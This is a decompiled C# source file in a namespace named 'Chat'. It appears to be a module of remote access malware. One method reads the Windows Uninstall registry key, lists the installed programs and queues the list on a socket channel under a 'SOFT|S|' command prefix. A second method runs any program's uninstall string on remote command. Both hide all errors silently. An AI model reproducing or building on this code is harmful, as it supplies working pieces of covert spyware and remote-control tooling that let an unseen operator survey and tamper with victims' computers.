namespace Chat
{
    using Chat.My;
    using Microsoft.VisualBasic.CompilerServices;
    using Microsoft.Win32;
    using System;
    using System.Diagnostics;
    using System.Runtime.CompilerServices;

    public class SoftwareCode
    {
        public static void GetAnySoftware()
        {
            try
            {
                string name = @"Software\Microsoft\Windows\CurrentVersion\Uninstall";
                string str = string.Empty;
                RegistryKey key = MyProject.Computer.Registry.LocalMachine.OpenSubKey(name);
                foreach (string str4 in key.GetSubKeyNames())
                {
                    string str2 = Conversions.ToString(key.OpenSubKey(str4).GetValue("DisplayName", ""));
                    if (str2 != "")
                    {
                        bool flag = true;
                        if (str2.IndexOf("Hotfix") != -1)
                        {
                            flag = false;
                        }
                        if (str2.IndexOf("Security Update") != -1)
                        {
                            flag = false;
                        }
                        if (str2.IndexOf("Update for") != -1)
                        {
                            flag = false;
                        }
                        if (flag)
                        {
                            str = str + str2 + "|A|";
                        }
                    }
                }
                Socketss.ListDataSend.Add(new Data("SOFT|S|" + str, null, null));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public static void UninstallSoftwareByName(string name)
        {
            try
            {
                string str2 = @"Software\Microsoft\Windows\CurrentVersion\Uninstall";
                RegistryKey key = MyProject.Computer.Registry.LocalMachine.OpenSubKey(str2);
                foreach (string str4 in key.GetSubKeyNames())
                {
                    RegistryKey key2 = key.OpenSubKey(str4);
                    if (Conversions.ToString(key2.GetValue("DisplayName", "")) == name)
                    {
                        NewLateBinding.LateCall(null, typeof(Process), "Start", new object[] { RuntimeHelpers.GetObjectValue(key2.GetValue("UninstallString", "")) }, null, null, null, true);
                        return;
                    }
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
    }
}

